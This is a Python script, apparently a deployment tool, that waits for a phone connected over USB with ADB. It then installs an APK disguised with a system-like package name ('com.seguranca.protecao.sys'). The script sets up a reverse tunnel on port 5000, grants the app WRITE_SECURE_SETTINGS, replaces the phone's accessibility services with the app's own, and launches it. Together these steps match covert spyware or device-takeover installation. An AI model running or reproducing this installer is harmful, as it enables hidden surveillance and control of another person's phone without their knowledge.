import sys
import os
import time
import subprocess
from pathlib import Path

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

def run_cmd(cmd):
    print(f">> {cmd}")
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
    if res.stdout:
        print(res.stdout.strip())
    if res.stderr:
        print(res.stderr.strip())
    return res

def main():
    print("=" * 65)
    print(" 📱 AGUARDANDO APARELHO SER CONECTADO VIA USB (ADB)...")
    print(" Conecte o cabo USB no celular e ative a Depuração USB.")
    print("=" * 65)

    base_root = Path(__file__).resolve().parent
    apk_path = (base_root / "gangstar_usb_app.apk").resolve()

    if not apk_path.exists():
        print(f"[ERRO] APK não encontrado em: {apk_path}")
        print("[INFO] Executando build do APK primeiro...")
        import build_and_install_usb
        build_and_install_usb.main()

    print(f"[INFO] APK pronto para instalação: {apk_path}")
    print("[INFO] Monitorando conexões USB/ADB... (Pressione Ctrl+C para cancelar)\n")

    detected_device = None
    attempts = 0

    while True:
        attempts += 1
        res = subprocess.run("adb devices", shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
        lines = [l.strip() for l in res.stdout.splitlines() if l.strip() and not l.startswith("List of")]
        devices = [l.split()[0] for l in lines if "\tdevice" in l]
        unauthorized = [l.split()[0] for l in lines if "\tunauthorized" in l]

        if unauthorized:
            print(f"\r[AVISO] Dispositivo {unauthorized[0]} conectado, mas pendente de autorização! OLHE A TELA DO CELULAR e confirme 'Permitir depuração USB'.", end="")
        elif devices:
            detected_device = devices[0]
            print(f"\n\n✅ DISPOSITIVO ENCONTRADO: {detected_device}")
            break
        else:
            dots = "." * (attempts % 4)
            print(f"\r⏳ Aguardando celular ser plugado no USB{dots}   ", end="", flush=True)

        time.sleep(2)

    print("\n" + "=" * 65)
    print(f"🚀 INICIANDO INSTALAÇÃO AUTOMÁTICA NO CELULAR ({detected_device})...")
    print("=" * 65)

    # 1. Configura adb reverse para a porta 5000
    run_cmd(f"adb -s {detected_device} reverse tcp:5000 tcp:5000")

    # 2. Instala APK
    print(f"[INFO] Instalando {apk_path.name} no aparelho...")
    install_res = run_cmd(f'adb -s {detected_device} install -r -d "{apk_path}"')

    if install_res.returncode != 0 or "Success" not in (install_res.stdout + install_res.stderr):
        print("[INFO] Tentando instalar com permissões concedidas (-g)...")
        run_cmd(f'adb -s {detected_device} install -r -d -g "{apk_path}"')

    # 3. Concede permissões e ativa serviços
    pkg = "com.seguranca.protecao.sys"
    print("[INFO] Configurando permissões e ativando serviços de acessibilidade...")
    run_cmd(f"adb -s {detected_device} shell pm grant {pkg} android.permission.WRITE_SECURE_SETTINGS")
    run_cmd(f"adb -s {detected_device} shell settings put secure enabled_accessibility_services none")
    run_cmd(f"adb -s {detected_device} shell settings put secure enabled_accessibility_services {pkg}/{pkg}.UiAssistBridge")
    run_cmd(f"adb -s {detected_device} shell settings put secure accessibility_enabled 1")
    
    # 4. Inicia aplicativo no celular
    print("[INFO] Abrindo o aplicativo no celular...")
    run_cmd(f"adb -s {detected_device} shell am start -n {pkg}/{pkg}.MainActivity")
    run_cmd(f"adb -s {detected_device} shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1")

    print("\n" + "=" * 65)
    print("🎉 APLICATIVO INSTALADO E INICIADO COM SUCESSO NO CELULAR!")
    print("=" * 65)

if __name__ == "__main__":
    main()
